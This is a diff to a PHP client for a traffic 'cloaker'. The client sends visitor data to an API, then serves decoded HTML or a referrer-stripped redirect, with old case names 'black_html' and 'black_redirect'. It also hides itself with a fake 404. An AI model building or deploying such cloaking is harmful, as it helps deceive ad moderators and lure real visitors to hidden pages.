@@ -4,23 +4,29 @@
  * 
  * Simple include file for connecting external PHP sites to the cloaker.
  * Just include this file in your index.php like:
- * require_once __DIR__ . '/fromfolder/cloaker_client.php';
+ * require_once __DIR__ . '/phpclient.php';
  */
 
-define("YC_API_KEY", "test");
-define("YC_API_URL", "http://localhost:8080/fromfolder/phpapi.php");
-
 //if called directly return 404, haha
-if (__FILE__ === $_SERVER['PHP_SELF']) {
+if (__FILE__ === $_SERVER['SCRIPT_FILENAME']) {
     http_response_code(404);
     exit;
 }
 
+define("YC_API_KEY", "test2");
+define("YC_API_URL", "http://localhost:8080/fromfolder/phpapi.php");
+define("YC_DEBUG", true);
+
 class YellowCloakerClient 
 {
+    public function __construct()
+    {
+        ob_start();
+        $this->requestClientHints();
+    }
+
     public function connect()
     {
-        $this->requestClientHints();
         $params = $this->collectParams();
         $response = $this->sendRequest($params);
         return $response;
@@ -31,19 +37,20 @@ class YellowCloakerClient
         if (!$response || !isset($response['action'])) 
             return;
         
+        $this->logdebug("Got response: " . json_encode($response));
         switch ($response['action']) {
-                
             case 'jscheck':
-            case 'black_html':
-                echo $response['content'];
+            case 'html':
+                ob_clean();
+                echo base64_decode($response['value']);
                 exit;
-                
-            case 'black_redirect':
+            case 'redirect':
+                ob_clean();
                 $redirect_type = $response['redirect_type'] ?? 302;
                 http_response_code($redirect_type);
-                header('Location: ' . $response['content']);
+                header("Referrer-Policy: no-referrer");
+                header('Location: ' . $response['value']);
                 exit;
-                
             default:
                 break;
         }
@@ -157,20 +164,24 @@ class YellowCloakerClient
         $dir = __DIR__ . "/ycclogs";
         if (!file_exists($dir)) 
             mkdir($dir, 0777, true);
-        $date = date("d.m.y");
+        $datetime = explode(' ', date("d.m.y H:i:s"));
+        $date = $datetime[0];  // "d.m.y"
+        $time = $datetime[1];  // "H:i:s"
         $fileName = "$dir/$date.log";
-        $file = fopen($fileName, 'a+');
-        $time = date("Y-m-d H:i:s");
         if ($addIp) {
             $ip = $this->getip();
             $time .= " $ip";
         }
         $msg = "$time $msg\n";
-        fwrite($file, $msg);
-        fflush($file);
-        fclose($file);
+        file_put_contents($fileName, $msg, FILE_APPEND | LOCK_EX);
+    }
+    
+    private function logdebug($msg){
+        if (!YC_DEBUG) return;
+        $this->log($msg, true);
     }
 
+        
 }
 
 $ycc = new YellowCloakerClient();
